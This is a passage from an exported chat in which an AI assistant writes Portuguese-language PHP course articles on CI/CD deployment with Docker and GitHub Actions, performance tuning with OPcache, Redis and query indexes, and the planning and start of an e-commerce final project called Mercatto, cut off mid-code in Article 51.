      - name: Cache do Composer
        uses: actions/cache@v3
        with:
          path: vendor
          key: composer-${{ hashFiles('composer.lock') }}

      - name: Instalar dependências
        run: composer install --no-interaction

      - name: Auditoria de segurança
        run: composer audit

      - name: Preparar ambiente de teste
        run: |
          cp .env.testing .env
          php artisan key:generate
          php artisan migrate --force

      - name: Análise estática
        run: vendor/bin/phpstan analyse --no-progress

      - name: Estilo de código
        run: vendor/bin/php-cs-fixer fix --dry-run --diff

      - name: Testes com cobertura
        run: vendor/bin/pest --coverage --min=75

  deploy:
    name: Deploy em Produção
    needs: testes
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'

    steps:
      - name: Deploy via SSH
        uses: appleboy/ssh-action@v1
        with:
          host: ${{ secrets.SERVIDOR_HOST }}
          username: ${{ secrets.SERVIDOR_USER }}
          key: ${{ secrets.SERVIDOR_SSH_KEY }}
          script: |
            cd /var/www/minha-loja
            bash deploy.sh main
```

---

## Docker para desenvolvimento padronizado

```dockerfile
# Dockerfile
FROM php:8.3-fpm-alpine

# Extensões necessárias
RUN docker-php-ext-install pdo pdo_mysql opcache
RUN apk add --no-cache libpng-dev && docker-php-ext-install gd

# OPcache — melhora performance significativamente em produção
COPY opcache.ini /usr/local/etc/php/conf.d/

WORKDIR /var/www/html
COPY . .
RUN composer install --no-dev --optimize-autoloader

RUN chown -R www-data:www-data storage bootstrap/cache
```

```yaml
# docker-compose.yml (desenvolvimento)
services:
  app:
    build: .
    volumes:
      - .:/var/www/html  # monta código local
    depends_on: [db, redis]

  nginx:
    image: nginx:alpine
    ports: ['8000:80']
    volumes:
      - .:/var/www/html
      - ./nginx.conf:/etc/nginx/conf.d/default.conf

  db:
    image: mysql:8.0
    environment:
      MYSQL_DATABASE: loja
      MYSQL_ROOT_PASSWORD: senha
    volumes:
      - db_data:/var/lib/mysql

  redis:
    image: redis:7-alpine

volumes:
  db_data:
```

---

## Monitoramento e logs

```php
<?php
// config/logging.php — Laravel

'channels' => [
    'stack' => [
        'driver'   => 'stack',
        'channels' => ['daily', 'slack'],
    ],

    'daily' => [
        'driver' => 'daily',
        'path'   => storage_path('logs/laravel.log'),
        'level'  => env('LOG_LEVEL', 'debug'),
        'days'   => 14,
    ],

    'slack' => [
        'driver'   => 'slack',
        'url'      => env('LOG_SLACK_WEBHOOK_URL'),
        'username' => 'Laravel Log',
        'level'    => 'critical',  // Apenas erros críticos vão para o Slack
    ],
],

// Uso — o mesmo que vimos na PSR-3:
Log::info('Pedido criado', ['id' => $pedido->id, 'total' => $pedido->total]);
Log::error('Falha no pagamento', ['pedido_id' => $id, 'erro' => $e->getMessage()]);
Log::critical('Banco de dados inacessível', ['exception' => $e]);
```

---

## Resumo

| Etapa | Ferramenta |
|---|---|
| Servidor web | NGINX + PHP-FPM |
| HTTPS | Let's Encrypt + Certbot |
| Deploy | Script bash + GitHub Actions |
| Containerização | Docker + Docker Compose |
| CI/CD | GitHub Actions (testes → deploy) |
| Logs | Monolog + Laravel Log (diário + Slack crítico) |

---

## Exercício da semana

1. Configure NGINX + PHP-FPM localmente com Docker. Crie um `docker-compose.yml` com app, nginx, mysql e redis. Garanta que o Laravel funciona completamente nesse ambiente.

2. Escreva o script `deploy.sh` completo. Teste localmente simulando as etapas. Adicione tratamento de erro: se `php artisan migrate` falhar, o script deve reverter o `git reset` e reativar a aplicação.

3. Configure o GitHub Actions com as etapas: composer audit, phpstan, php-cs-fixer, pest. Faça um PR intencional com erro e confirme que o CI falha.

4. **Desafio:** configure um pipeline de deploy com **zero downtime real** usando o padrão de diretórios `releases/`: cada deploy cria um novo diretório com timestamp, um symlink `current` aponta para o release ativo, e os últimos 5 releases são mantidos para rollback instantâneo.

---

## Referências

- NGINX Docs: https://nginx.org/en/docs/
- PHP-FPM Configuration: https://www.php.net/manual/pt_BR/install.fpm.configuration.php
- GitHub Actions: https://docs.github.com/en/actions
- Docker for PHP: https://hub.docker.com/_/php
- Let's Encrypt: https://letsencrypt.org/

---

# Artigo 49 — Performance e Otimização

**Módulo 10 · Semana 49 · Nível: Avançado**

---

## Introdução

Performance não é premature optimization — é entender onde estão os gargalos reais e eliminá-los sistematicamente. A regra 80/20 se aplica com precisão: 80% dos problemas de performance vêm de 20% do código, e esses 20% quase sempre são consultas ao banco de dados mal escritas ou ausência de cache.

---

## OPcache — a otimização mais simples e impactante

O PHP, por padrão, parseia e compila cada arquivo `.php` em cada requisição. OPcache armazena o bytecode compilado em memória, eliminando essa etapa:

```ini
; /etc/php/8.3/fpm/conf.d/10-opcache.ini
opcache.enable                = 1
opcache.enable_cli            = 0
opcache.memory_consumption    = 256      ; MB
opcache.interned_strings_buffer = 16
opcache.max_accelerated_files = 20000
opcache.revalidate_freq       = 0       ; 0 = nunca revalida em produção
opcache.validate_timestamps   = 0       ; 0 = não verifica timestamps (produção)
opcache.save_comments         = 1       ; necessário para Doctrine/annotations
opcache.jit_buffer_size       = 100M    ; JIT — PHP 8+
opcache.jit                   = 1255    ; habilita JIT
```

O impacto é imediato e significativo: aplicações PHP típicas ficam entre 2x e 5x mais rápidas apenas com OPcache bem configurado.

---

## Cache de queries com Redis

```php
<?php
declare(strict_types=1);

class ProdutoRepositorioComCache implements ProdutoRepositorioInterface
{
    private const TTL_LISTA    = 300;  // 5 minutos
    private const TTL_PRODUTO  = 3600; // 1 hora

    public function __construct(
        private readonly ProdutoRepositorioInterface $repositorio,
        private readonly \Redis $redis,
    ) {}

    public function listarAtivos(int $pagina = 1): array
    {
        $chave = "produtos:lista:pagina:{$pagina}";

        $cached = $this->redis->get($chave);
        if ($cached !== false) {
            return json_decode($cached, associative: true);
        }

        $resultado = $this->repositorio->listarAtivos($pagina);
        $this->redis->setex($chave, self::TTL_LISTA, json_encode($resultado));

        return $resultado;
    }

    public function buscarPorId(int $id): ?array
    {
        $chave = "produtos:id:{$id}";

        $cached = $this->redis->get($chave);
        if ($cached !== false) {
            return json_decode($cached, associative: true);
        }

        $produto = $this->repositorio->buscarPorId($id);

        if ($produto !== null) {
            $this->redis->setex($chave, self::TTL_PRODUTO, json_encode($produto));
        }

        return $produto;
    }

    public function invalidarCache(int $id): void
    {
        $this->redis->del("produtos:id:{$id}");

        // Invalida todas as páginas da listagem
        $chaves = $this->redis->keys('produtos:lista:*');
        if (!empty($chaves)) {
            $this->redis->del(...$chaves);
        }
    }
}
```

---

## Detectando e corrigindo o problema N+1

O N+1 é o assassino de performance mais comum em ORMs. Acontece quando você faz 1 query para buscar N registros e depois N queries para buscar dados relacionados:

```php
<?php
// PROBLEMA: 1 query para listar 50 pedidos + 50 queries para buscar o cliente de cada um
$pedidos = Pedido::where('status', 'pendente')->get(); // 1 query

foreach ($pedidos as $pedido) {
    echo $pedido->usuario->nome; // 1 query por iteração = 50 queries!
}

// SOLUÇÃO: eager loading — traz tudo em 2 queries
$pedidos = Pedido::with('usuario')
    ->where('status', 'pendente')
    ->get(); // 2 queries: uma para pedidos, uma para todos os usuários relacionados

foreach ($pedidos as $pedido) {
    echo $pedido->usuario->nome; // sem query adicional
}

// Para detectar N+1 automaticamente no Laravel:
// composer require --dev barryvdh/laravel-debugbar
// Ou no código:
\DB::listen(function ($query) {
    if ($query->time > 100) {
        \Log::warning("Query lenta ({$query->time}ms): {$query->sql}");
    }
});
```

---

## Índices de banco de dados

```sql
-- Analisar uma query lenta com EXPLAIN ANALYZE (PostgreSQL) ou EXPLAIN (MySQL)
EXPLAIN ANALYZE
SELECT p.*, c.nome AS categoria
FROM produtos p
JOIN categorias c ON c.id = p.categoria_id
WHERE p.ativo = true AND p.estoque > 0
ORDER BY p.criado_em DESC
LIMIT 15;

-- Se aparecer "Seq Scan" numa tabela grande, adicione índice:
CREATE INDEX idx_produtos_ativo_estoque ON produtos(ativo, estoque)
    WHERE ativo = true AND estoque > 0;  -- índice parcial (PostgreSQL)

CREATE INDEX idx_produtos_criado_em ON produtos(criado_em DESC);

-- Índice para busca de texto (MySQL)
ALTER TABLE produtos ADD FULLTEXT INDEX idx_fulltext_nome_descricao(nome, descricao);

-- Verificar uso de índices no MySQL
SHOW INDEX FROM produtos;
SELECT * FROM sys.schema_unused_indexes; -- índices que nunca são usados
```

---

## Filas para tarefas pesadas

Nada degrada a experiência do usuário mais do que uma requisição HTTP esperando um email ser enviado, um PDF ser gerado, ou uma imagem ser processada. Mova tudo que pode esperar para fila:

```php
<?php
// No Laravel
namespace App\Jobs;

use App\Models\Pedido;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;

class ProcessarPedido implements ShouldQueue
{
    use Dispatchable, Queueable;

    public int $tries   = 3;
    public int $timeout = 120;

    public function __construct(
        private readonly int $pedidoId
    ) {}

    public function handle(): void
    {
        $pedido = Pedido::findOrFail($this->pedidoId);

        // Operações pesadas aqui — não bloqueiam a resposta HTTP
        $this->processarPagamento($pedido);
        $this->notificarVendedor($pedido);
        $this->atualizarEstoque($pedido);
        $this->enviarEmailConfirmacao($pedido);
    }

    public function backoff(): array
    {
        return [30, 60, 120]; // segundos entre retentativas
    }
}

// Disparar — retorna imediatamente para o usuário
ProcessarPedido::dispatch($pedido->id);

// Com delay
ProcessarPedido::dispatch($pedido->id)->delay(now()->addMinutes(5));
```

---

## Profiling com Xdebug e Blackfire

```bash
# Instalar Blackfire (profiler profissional)
curl -sS https://packages.blackfire.io/gpg.key | sudo apt-key add -
echo "deb http://packages.blackfire.io/debian any main" | sudo tee /etc/apt/sources.list.d/blackfire.list
sudo apt update && sudo apt install blackfire

# Perfilar uma requisição
blackfire curl http://localhost:8000/produtos

# Saída mostra:
# - Funções mais lentas
# - Queries mais lentas
# - Memória consumida
# - Chamadas de função e tempo em cada uma
```

---

## Resumo

| Técnica | Impacto típico |
|---|---|
| OPcache + JIT | 2–5x de melhoria geral |
| Cache de queries (Redis) | Elimina 80–99% das queries repetidas |
| Eager loading | Reduz N queries para 2 |
| Índices corretos | 10–1000x em queries específicas |
| Filas para tarefas pesadas | Resposta HTTP < 200ms |
| Blackfire | Identifica exatamente onde está o gargalo |

---

## Exercício da semana

1. Configure OPcache e JIT no PHP. Use `apache bench` (`ab -n 1000 -c 10 http://localhost/`) para medir o impacto antes e depois.

2. Identifique um N+1 em um projeto seu usando `\DB::listen()`. Corrija com `with()` e meça a diferença no número de queries.

3. Adicione cache Redis ao repositório de produtos: lista com TTL de 5 minutos, produto individual com 1 hora. Implemente invalidação ao criar/atualizar/deletar.

4. Mova o envio de email de confirmação de pedido para uma job. Garanta que o endpoint `/pedidos` retorna em menos de 200ms mesmo que o email demore 2 segundos.

5. **Desafio:** implemente cache HTTP com `ETag` e `Last-Modified`: na rota de listagem de produtos, calcule o hash do resultado, envie como `ETag`. Se o cliente enviar `If-None-Match` com o mesmo hash, retorne `304 Not Modified` sem corpo — economizando banda e processamento.

---

## Referências

- PHP OPcache: https://www.php.net/manual/pt_BR/book.opcache.php
- Redis para PHP: https://github.com/phpredis/phpredis
- Blackfire Profiler: https://www.blackfire.io/
- Laravel Queues: https://laravel.com/docs/queues
- Use The Index, Luke (guia de índices SQL): https://use-the-index-luke.com/

---

**Progresso: 49/52 artigos — faltam apenas 3.**

Artigos restantes:
- **50** — Projeto Final Parte 1: Planejamento e Arquitetura
- **51** — Projeto Final Parte 2: Implementação
- **52** — Projeto Final Parte 3: Testes, Deploy e Encerramento

Continuo com o projeto final?

---

# you asked

message time: 2026-03-10 08:45:41

Sim.

---

# claude response

# Artigo 50 — Projeto Final Parte 1: Planejamento e Arquitetura

**Módulo 11 · Semana 50 · Nível: Avançado**

---

## Introdução

Chegamos ao projeto final. Quarenta e nove artigos de fundamentos, orientação a objetos, bancos de dados, web, segurança, frameworks, testes e deploy. Agora é hora de integrar tudo isso em um sistema real, coeso e profissional.

O projeto é uma **plataforma de e-commerce** chamada **Mercatto** — simples o suficiente para ser implementado em três semanas, complexo o suficiente para exercitar todos os conceitos aprendidos. Não vamos construir um sistema com todas as funcionalidades imagináveis. Vamos construir um sistema bem feito, com as funcionalidades certas, do jeito certo.

---

## Escopo do sistema

**O que o Mercatto faz:**

- Catálogo de produtos com categorias, busca e filtros
- Carrinho de compras persistido em sessão
- Checkout com endereço de entrega
- Processamento de pedidos com status
- Painel do cliente: pedidos, histórico, perfil
- Painel administrativo: produtos, pedidos, relatórios
- API REST para integração com apps mobile
- Notificações por email em eventos importantes

**O que deliberadamente não está no escopo:**
- Integração com gateway de pagamento real (simulamos)
- Sistema de avaliações de produtos
- Multi-tenant / múltiplos vendedores
- Internacionalização

Escopo claro é tão importante quanto o código. Um projeto sem fronteiras definidas nunca termina.

---

## Arquitetura — decisões e justificativas

Antes de escrever uma linha de código, tomamos decisões arquiteturais. Cada decisão tem uma justificativa — não escolhemos tecnologias por modismo, mas por adequação ao problema.

**Arquitetura em camadas:**

```
┌─────────────────────────────────────────────┐
│              HTTP Layer                      │
│  Routes → Middleware → Controllers           │
├─────────────────────────────────────────────┤
│           Application Layer                  │
│  Form Requests → Services → Jobs            │
├─────────────────────────────────────────────┤
│             Domain Layer                     │
│  Models → Value Objects → Domain Events     │
├─────────────────────────────────────────────┤
│          Infrastructure Layer                │
│  Eloquent Repositories → Cache → Queue      │
└─────────────────────────────────────────────┘
```

Essa separação garante que a lógica de negócio (Domain) não depende de como os dados são persistidos (Infrastructure) nem de como chegam ao sistema (HTTP). Você troca o banco de dados sem tocar nas regras de negócio. Testa as regras sem subir o servidor HTTP.

**Stack tecnológico:**

| Camada | Tecnologia | Justificativa |
|---|---|---|
| Framework | Laravel 11 | Produtividade, ecossistema, convenções sólidas |
| Banco de dados | PostgreSQL 16 | JSONB para atributos de produto, confiabilidade |
| Cache | Redis 7 | Cache de queries, sessões, filas |
| Filas | Laravel Queue + Redis | Emails e processamento assíncrono |
| Testes | Pest + SQLite in-memory | Velocidade e isolamento |
| Deploy | Docker + GitHub Actions | Reprodutibilidade e automação |

---

## Modelagem do banco de dados

```sql
-- Schema completo do Mercatto

CREATE TABLE categorias (
    id          SERIAL PRIMARY KEY,
    nome        VARCHAR(100) NOT NULL,
    slug        VARCHAR(120) NOT NULL UNIQUE,
    descricao   TEXT,
    ativa       BOOLEAN NOT NULL DEFAULT TRUE,
    criada_em   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    atualizada_em TIMESTAMPTZ
);

CREATE TABLE produtos (
    id              SERIAL PRIMARY KEY,
    categoria_id    INTEGER NOT NULL REFERENCES categorias(id),
    nome            VARCHAR(200) NOT NULL,
    slug            VARCHAR(220) NOT NULL UNIQUE,
    descricao       TEXT,
    preco           NUMERIC(10,2) NOT NULL CHECK (preco >= 0),
    preco_promocional NUMERIC(10,2) CHECK (preco_promocional >= 0),
    estoque         INTEGER NOT NULL DEFAULT 0 CHECK (estoque >= 0),
    ativo           BOOLEAN NOT NULL DEFAULT TRUE,
    atributos       JSONB,          -- cor, tamanho, material, etc.
    imagens         JSONB,          -- array de paths
    criado_em       TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    atualizado_em   TIMESTAMPTZ,
    deleted_at      TIMESTAMPTZ     -- soft delete
);

CREATE TABLE usuarios (
    id              SERIAL PRIMARY KEY,
    nome            VARCHAR(150) NOT NULL,
    email           VARCHAR(200) NOT NULL UNIQUE,
    senha_hash      VARCHAR(255) NOT NULL,
    cpf_cript       TEXT,           -- AES-256-GCM
    telefone_cript  TEXT,
    role            VARCHAR(20) NOT NULL DEFAULT 'cliente',
    ativo           BOOLEAN NOT NULL DEFAULT TRUE,
    criado_em       TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE TABLE enderecos (
    id          SERIAL PRIMARY KEY,
    usuario_id  INTEGER NOT NULL REFERENCES usuarios(id),
    rotulo      VARCHAR(50) NOT NULL DEFAULT 'Casa',
    cep         VARCHAR(9) NOT NULL,
    logradouro  VARCHAR(200) NOT NULL,
    numero      VARCHAR(20) NOT NULL,
    complemento VARCHAR(100),
    bairro      VARCHAR(100) NOT NULL,
    cidade      VARCHAR(100) NOT NULL,
    estado      CHAR(2) NOT NULL,
    principal   BOOLEAN NOT NULL DEFAULT FALSE,
    criado_em   TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE TABLE pedidos (
    id              SERIAL PRIMARY KEY,
    usuario_id      INTEGER NOT NULL REFERENCES usuarios(id),
    endereco_id     INTEGER NOT NULL REFERENCES enderecos(id),
    status          VARCHAR(30) NOT NULL DEFAULT 'pendente',
    subtotal        NUMERIC(10,2) NOT NULL,
    desconto        NUMERIC(10,2) NOT NULL DEFAULT 0,
    frete           NUMERIC(10,2) NOT NULL DEFAULT 0,
    total           NUMERIC(10,2) NOT NULL,
    observacoes     TEXT,
    criado_em       TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    atualizado_em   TIMESTAMPTZ,

    CONSTRAINT status_valido CHECK (
        status IN ('pendente','confirmado','em_preparo','enviado','entregue','cancelado')
    )
);

CREATE TABLE pedido_itens (
    id              SERIAL PRIMARY KEY,
    pedido_id       INTEGER NOT NULL REFERENCES pedidos(id) ON DELETE CASCADE,
    produto_id      INTEGER NOT NULL REFERENCES produtos(id),
    nome_produto    VARCHAR(200) NOT NULL,   -- snapshot do nome no momento da compra
    preco_unitario  NUMERIC(10,2) NOT NULL,  -- snapshot do preço
    quantidade      INTEGER NOT NULL CHECK (quantidade > 0),
    subtotal        NUMERIC(10,2) NOT NULL
);

CREATE TABLE personal_access_tokens (
    id          BIGSERIAL PRIMARY KEY,
    tokenable_type VARCHAR(255) NOT NULL,
    tokenable_id   BIGINT NOT NULL,
    name        VARCHAR(255) NOT NULL,
    token       VARCHAR(64) NOT NULL UNIQUE,
    abilities   TEXT,
    last_used_at TIMESTAMPTZ,
    expires_at  TIMESTAMPTZ,
    created_at  TIMESTAMPTZ,
    updated_at  TIMESTAMPTZ
);

-- Índices de performance
CREATE INDEX idx_produtos_categoria    ON produtos(categoria_id) WHERE deleted_at IS NULL;
CREATE INDEX idx_produtos_ativo        ON produtos(ativo, estoque) WHERE deleted_at IS NULL;
CREATE INDEX idx_produtos_slug         ON produtos(slug);
CREATE INDEX idx_pedidos_usuario       ON pedidos(usuario_id);
CREATE INDEX idx_pedidos_status        ON pedidos(status, criado_em DESC);
CREATE INDEX idx_produtos_atributos    ON produtos USING gin(atributos);
```

---

## Estrutura de diretórios do projeto

```
mercatto/
├── app/
│   ├── Domain/
│   │   ├── Carrinho/
│   │   │   ├── Carrinho.php
│   │   │   ├── ItemDoCarrinho.php
│   │   │   └── CarrinhoService.php
│   │   ├── Pedido/
│   │   │   ├── Pedido.php
│   │   │   ├── StatusDoPedido.php   ← Enum
│   │   │   └── PedidoService.php
│   │   └── Produto/
│   │       ├── Produto.php
│   │       └── Dinheiro.php         ← Value Object
│   ├── Http/
│   │   ├── Controllers/
│   │   │   ├── Web/
│   │   │   │   ├── CatalogoController.php
│   │   │   │   ├── CarrinhoController.php
│   │   │   │   └── CheckoutController.php
│   │   │   ├── Admin/
│   │   │   │   ├── ProdutoController.php
│   │   │   │   └── PedidoController.php
│   │   │   └── Api/
│   │   │       ├── AuthController.php
│   │   │       └── ProdutoController.php
│   │   ├── Middleware/
│   │   └── Requests/
│   ├── Jobs/
│   │   ├── ProcessarPedido.php
│   │   └── EnviarEmailDePedido.php
│   ├── Models/
│   ├── Providers/
│   └── Services/
├── database/migrations/
├── resources/views/
│   ├── layouts/
│   ├── catalogo/
│   ├── carrinho/
│   ├── checkout/
│   ├── pedidos/
│   └── admin/
├── routes/
│   ├── web.php
│   ├── admin.php
│   └── api.php
└── tests/
    ├── Unit/
    │   ├── Domain/
    │   └── Services/
    └── Feature/
        ├── Web/
        └── Api/
```

---

## Value Objects e Enums do domínio

```php
<?php
declare(strict_types=1);

namespace App\Domain\Produto;

final readonly class Dinheiro
{
    public function __construct(private int $centavos)
    {
        if ($centavos < 0) {
            throw new \InvalidArgumentException('Valor monetário não pode ser negativo.');
        }
    }

    public static function dereais(float $reais): self
    {
        return new self((int) round($reais * 100));
    }

    public function centavos(): int  { return $this->centavos; }

    public function reais(): float   { return $this->centavos / 100; }

    public function somar(self $outro): self
    {
        return new self($this->centavos + $outro->centavos);
    }

    public function subtrair(self $outro): self
    {
        if ($outro->centavos > $this->centavos) {
            throw new \DomainException('Subtração resultaria em valor negativo.');
        }
        return new self($this->centavos - $outro->centavos);
    }

    public function multiplicar(int $fator): self
    {
        return new self($this->centavos * $fator);
    }

    public function aplicarDesconto(float $percentual): self
    {
        if ($percentual < 0 || $percentual > 100) {
            throw new \InvalidArgumentException("Percentual inválido: {$percentual}");
        }
        $desconto = (int) round($this->centavos * $percentual / 100);
        return new self($this->centavos - $desconto);
    }

    public function formatar(): string
    {
        return 'R$ ' . number_format($this->reais(), 2, ',', '.');
    }

    public function equals(self $outro): bool
    {
        return $this->centavos === $outro->centavos;
    }

    public function maiorQue(self $outro): bool
    {
        return $this->centavos > $outro->centavos;
    }
}
```

```php
<?php
declare(strict_types=1);

namespace App\Domain\Pedido;

enum StatusDoPedido: string
{
    case Pendente    = 'pendente';
    case Confirmado  = 'confirmado';
    case EmPreparo   = 'em_preparo';
    case Enviado     = 'enviado';
    case Entregue    = 'entregue';
    case Cancelado   = 'cancelado';

    public function label(): string
    {
        return match($this) {
            self::Pendente   => 'Aguardando confirmação',
            self::Confirmado => 'Confirmado',
            self::EmPreparo  => 'Em preparação',
            self::Enviado    => 'Enviado',
            self::Entregue   => 'Entregue',
            self::Cancelado  => 'Cancelado',
        };
    }

    public function cor(): string
    {
        return match($this) {
            self::Pendente   => 'amarelo',
            self::Confirmado => 'azul',
            self::EmPreparo  => 'laranja',
            self::Enviado    => 'roxo',
            self::Entregue   => 'verde',
            self::Cancelado  => 'vermelho',
        };
    }

    public function podeTransicionarPara(self $proximo): bool
    {
        return match($this) {
            self::Pendente   => in_array($proximo, [self::Confirmado, self::Cancelado]),
            self::Confirmado => in_array($proximo, [self::EmPreparo, self::Cancelado]),
            self::EmPreparo  => in_array($proximo, [self::Enviado, self::Cancelado]),
            self::Enviado    => $proximo === self::Entregue,
            self::Entregue,
            self::Cancelado  => false, // estados finais
        };
    }
}
```

---

## Carrinho de compras — lógica de domínio

```php
<?php
declare(strict_types=1);

namespace App\Domain\Carrinho;

use App\Domain\Produto\Dinheiro;

final class ItemDoCarrinho
{
    public function __construct(
        public readonly int     $produtoId,
        public readonly string  $nomeProduto,
        public readonly Dinheiro $precoUnitario,
        private int             $quantidade,
    ) {
        if ($quantidade <= 0) {
            throw new \InvalidArgumentException('Quantidade deve ser maior que zero.');
        }
    }

    public function quantidade(): int    { return $this->quantidade; }

    public function subtotal(): Dinheiro
    {
        return $this->precoUnitario->multiplicar($this->quantidade);
    }

    public function incrementar(int $qtd = 1): self
    {
        $novo = clone $this;
        $novo->quantidade += $qtd;
        return $novo;
    }

    public function comQuantidade(int $quantidade): self
    {
        $novo = clone $this;
        $novo->quantidade = $quantidade;
        return $novo;
    }
}

final class Carrinho
{
    /** @var array<int, ItemDoCarrinho> */
    private array $itens = [];

    public function adicionar(ItemDoCarrinho $novoItem): void
    {
        if (isset($this->itens[$novoItem->produtoId])) {
            $this->itens[$novoItem->produtoId] = $this->itens[$novoItem->produtoId]
                ->incrementar($novoItem->quantidade());
        } else {
            $this->itens[$novoItem->produtoId] = $novoItem;
        }
    }

    public function atualizar(int $produtoId, int $quantidade): void
    {
        if (!isset($this->itens[$produtoId])) {
            throw new \DomainException("Produto {$produtoId} não está no carrinho.");
        }

        if ($quantidade <= 0) {
            $this->remover($produtoId);
            return;
        }

        $this->itens[$produtoId] = $this->itens[$produtoId]->comQuantidade($quantidade);
    }

    public function remover(int $produtoId): void
    {
        unset($this->itens[$produtoId]);
    }

    public function limpar(): void
    {
        $this->itens = [];
    }

    public function total(): Dinheiro
    {
        return array_reduce(
            $this->itens,
            fn(Dinheiro $acc, ItemDoCarrinho $item) => $acc->somar($item->subtotal()),
            new Dinheiro(0),
        );
    }

    public function quantidadeDeItens(): int
    {
        return array_sum(array_map(fn($i) => $i->quantidade(), $this->itens));
    }

    public function estaVazio(): bool { return empty($this->itens); }

    /** @return array<int, ItemDoCarrinho> */
    public function itens(): array { return $this->itens; }
}
```

---

## Exercício da semana

1. Configure o projeto Laravel com PostgreSQL, Redis e as migrations do schema acima. Execute `php artisan migrate` com sucesso.

2. Implemente `Dinheiro` e `StatusDoPedido` exatamente como no artigo. Escreva testes unitários Pest cobrindo todos os métodos, incluindo `podeTransicionarPara()` com todas as combinações de estados.

3. Implemente `Carrinho` e `ItemDoCarrinho` com testes: adicionar item novo, adicionar item existente (incrementa), atualizar quantidade, remover, calcular total com múltiplos itens, comportamento ao atualizar com quantidade zero.

4. Escreva os Service Providers do projeto: bind de todos os repositórios, configuração do Redis, configuração dos canais de log.

5. **Desafio:** implemente `CarrinhoService` que persiste o `Carrinho` na sessão do Laravel (serializa para JSON, desserializa ao carregar). Garanta que o carrinho sobrevive entre requisições e que itens com estoque zerado são removidos automaticamente ao carregar.

---

## Referências

- Laravel Application Structure: https://laravel.com/docs/structure
- Domain-Driven Design (livro) — Eric Evans: https://www.amazon.com.br/Domain-Driven-Design-Eric-Evans/dp/0321125215
- PostgreSQL Schema Design: https://www.postgresql.org/docs/current/ddl.html

---

# Artigo 51 — Projeto Final Parte 2: Implementação

**Módulo 11 · Semana 51 · Nível: Avançado**

---

## Introdução

Com o planejamento sólido do artigo anterior, agora implementamos o sistema camada por camada. A ordem importa: domínio primeiro, infraestrutura depois, HTTP por último. Isso garante que a lógica central nunca depende de detalhes de implementação.

---

## Models Eloquent

```php
<?php
declare(strict_types=1);

namespace App\Models;

use App\Domain\Pedido\StatusDoPedido;
use App\Domain\Produto\Dinheiro;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\SoftDeletes;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Illuminate\Database\Eloquent\Relations\HasMany;
use Illuminate\Support\Str;

class Produto extends Model
{
    use HasFactory, SoftDeletes;

    protected $fillable = [
        'categoria_id', 'nome', 'slug', 'descricao',
        'preco', 'preco_promocional', 'estoque', 'ativo', 'atributos', 'imagens',
    ];

    protected $casts = [
        'preco'             => 'decimal:2',
        'preco_promocional' => 'decimal:2',
        'estoque'           => 'integer',
        'ativo'             => 'boolean',
        'atributos'         => 'array',
        'imagens'           => 'array',
    ];

    protected static function booted(): void
    {
        static::creating(fn(self $p) => $p->slug ??= Str::slug($p->nome));
        static::updating(fn(self $p) => $p->atualizado_em = now());
    }

    public function precoAtual(): Dinheiro
    {
        $valor = $this->preco_promocional ?? $this->preco;
        return Dinheiro::dereais((float) $valor);
    }

    public function temPromocao(): bool
    {
        return $this->preco_promocional !== null
            && (float) $this->preco_promocional < (float) $this->preco;
    }

    public function estaDisponivel(): bool
    {
        return $this->ativo && $this->estoque > 0 && $this->deleted_at === null;
    }

    public function scopeDisponivel($query)
    {
        return $query->where('ativo', true)->where('estoque', '>', 0);
    }

    public function scopeDaCategoria($query, int $categoriaId)
    {
        return $query->where('categoria_id', $categoriaId);
    }

    public function categoria(): BelongsTo
    {
        return $this->belongsTo(Categoria::class);
    }

    public function itensDePedido(): HasMany
    {
        return $this->hasMany(PedidoItem::class);
    }
}

class Pedido extends Model
{
    protected $fillable = [
        'usuario_id', 'endereco_id', 'status',
        'subtotal', 'desconto', 'frete', 'total', 'observacoes',
    ];

    protected $casts = [
        'status'    => StatusDoPedido::class, // cast para Enum nativo
        'subtotal'  => 'decimal:2',
        'desconto'  => 'decimal:2',
        'frete'     => 'decimal:2',
        'total'     => 'decimal:2',
    ];

    public function podeSerCancelado(): bool
    {
        return $this->status->podeTransicionarPara(StatusDoPedido::Cancelado);
    }

    public function transicionarPara(StatusDoPedido $novoStatus): void
    {
        if (!$this->status->podeTransicionarPara($novoStatus)) {
            throw new \DomainException(
                "Não é possível ir de {$this->status->label()} para {$novoStatus->label()}."
            );
        }

        $this->update([
            'status'        => $novoStatus,
            'atualizado_em' => now(),
        ]);
    }

    public function usuario(): BelongsTo { return $this->belongsTo(User::class); }
    public function endereco(): BelongsTo { return $this->belongsTo(Endereco::class); }
    public function itens(): HasMany     { return $this->hasMany(PedidoItem::class); }
}
```

---

## PedidoService — orquestrando o checkout

```php
<?php
declare(strict_types=1);

namespace App\Services;

use App\Domain\Carrinho\Carrinho;
use App\Domain\Pedido\StatusDoPedido;
use App\Domain\Produto\Dinheiro;
use App\Jobs\ProcessarPedido;
use App\Models\Endereco;
use App\Models\Pedido;
use App\Models\PedidoItem;
use App\Models\Produto;
use App\Models\User;
use Illuminate\Support\Facades\DB;

final class PedidoService
{
    private const FRETE_GRATIS_ACIMA = 20000; // R$ 200,00 em centavos
    private const FRETE_PADRAO       = 1990;  // R$ 19,90 em centavos

    public function criarDesdoCarrinho(
        Carrinho $carrinho,
        User     $usuario,
        Endereco $endereco,
        ?string  $observacoes = null,
    ): Pedido {
        if ($carrinho->estaVazio()) {
            throw new \DomainException('O carrinho está vazio.');
        }

        // Valida estoque de todos os itens antes de começar a transação
        foreach ($carrinho->itens() as $item) {
            $produto = Produto::findOrFail($item->produtoId);

            if (!$produto->estaDisponivel()) {
                throw new \DomainException(
                    "O produto \"{$produto->nome}\" não está mais disponível."
                );
            }

            if ($produto->estoque < $item->quantidade()) {
                throw new \DomainException(
                    "Estoque insuficiente para \"{$produto->nome}\": "
                    . "disponível {$produto->estoque}, solicitado {$item->quantidade()}."
                );
            }
        }

        return DB::transaction(function () use ($carrinho, $usuario, $endereco, $observacoes) {
            $subtotal = $carrinho->total();
            $frete    = $subtotal->centavos() >= self::FRETE_GRATIS_ACIMA
